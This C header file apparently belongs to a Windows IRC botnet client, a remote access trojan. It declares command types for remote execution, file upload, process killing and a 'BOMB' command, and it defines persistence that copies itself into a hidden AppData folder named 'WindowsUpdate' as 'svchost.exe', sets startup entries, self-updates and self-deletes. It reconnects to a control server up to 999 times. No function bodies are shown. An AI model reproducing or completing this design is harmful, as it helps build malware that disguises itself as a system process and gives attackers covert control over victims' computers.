
#ifndef HEADER
#define HEADER


#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>       // Socket connection
#include <windows.h>        // WinAPI calls
#include <ws2tcpip.h>       // TCP-IP Sockets
#include <stdio.h>
#include <string.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <malloc.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")



// Constants
#define DEFAULT_BUFLEN 4096
#define MAX_SEND_LENGTH 400  // 最大发送长度（接近但不超过IRC限制）
#define SEND_INTERVAL 500    // 发送间隔（毫秒）
#define MAX_RECONNECT_ATTEMPTS 999
#define RECONNECT_INTERVAL 5000 // 单位：毫秒
#define LONG_SLEEP_INTERVAL 1000*60*60*1 // 1小时


// 隐藏文件夹路径
#define HIDDEN_FOLDER L"\\WindowsUpdate"  // 直接放在 AppData\\Local 下
#define TARGET_EXE_NAME L"svchost.exe"

#define UPDATE_FOLFER L"\\NewVersion"

#define DEBUG 0
#define HIDE_ON_ENTRY 1


extern HANDLE hMutex;

typedef enum
{
    CMD_UNKNOWN,
    CMD_EXECUTE,
    CMD_GETHOSTNAME,
    CMD_GETUPTIME,
    CMD_SETSTARTUP,
    CMD_FILE_UPLOAD,
    CMD_KILL_PROCESS,
    CMD_BOMB,
    CMD_LS,
    CMD_RUN,
    CMD_PWD,
    CMD_CD,
    CMD_CAT,
    CMD_UPDATE_EXE,
    CMD_GET_APPDATA_PATH
}CommandType;
typedef struct
{
    CommandType type;
    char* params[10]; // 最多支持 10 个参数
    int num_params;
} ParsedCommand;

// 消息缓冲区结构
typedef struct {
    char buffer[DEFAULT_BUFLEN];  // 消息缓冲区
    size_t length;                // 当前缓冲区长度
    char target[128];             // 目标接收者
    time_t lastSendTime;          // 上次发送时间
} MessageBuffer;




//function.cpp
BYTE* base64_decode(const char* input, DWORD in_len, DWORD* out_len);
int handle_file_upload(ParsedCommand cmd);
int run_executable(const char* path, int mode);//show normal by default 
char* list_directory(const char* path);
char* pwd_command();
char* cd_command(const char* path);
char* cat_file(const char* path);

char* ExecuteCommand(const char* command);
void set_startup(const char* program_path, int enable);


//read_command.cpp
ParsedCommand parsecommand(char* raw_command);
char* execute_parsed_command(ParsedCommand cmd, SOCKET tcpsock);

//network.c
SOCKET TCPhandler(const char* server, const char* baseNick);


//message.c


void flushBuffer(MessageBuffer* mb, SOCKET sock);
void initMessageBuffer(MessageBuffer* mb, const char* target);
void appendToBuffer(MessageBuffer* mb, SOCKET sock, const char* message);

//persistence.c
void get_current_module_path(wchar_t* path, size_t len);
int copy_and_hide_bot();
int is_hidden_bot();
void get_appdata_path(wchar_t* path, size_t len);
int create_hidden_directory(const wchar_t* path);
int delete_self_with_batch();

//compress.c
int compress_with_powershell(const char* source_dir, const char* output_zip);
int decompress_with_powershell(const char* zip_file, const char* dest_dir);


//update_exe.c
int update_exe(char* path);

//hash.c
int compute_sha256(const BYTE* data, size_t len, char output[65]);
  
#endif